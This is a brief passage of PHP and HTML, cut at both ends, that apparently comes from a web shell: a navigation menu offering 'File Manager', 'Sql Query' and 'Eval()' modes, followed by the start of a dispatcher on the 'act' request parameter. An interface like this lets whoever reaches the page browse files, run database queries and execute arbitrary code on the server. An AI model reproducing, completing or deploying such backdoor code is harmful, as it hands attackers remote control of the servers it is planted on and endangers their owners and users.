...
<td width="20%" align="center"><a href="<?php echo $myname?>?act=manager"> File Manager</a></td>
<td width="20%" align="center"><a href="<?php echo $myname?>?act=sql">Sql Query</a></td>
<td width="20%" align="center"><a href="<?php echo $myname?>?act=eval">Eval()</a></td><tr>
<td colspan="3" >
<?php
$act=@$_GET['act'];
if($act=="info"){
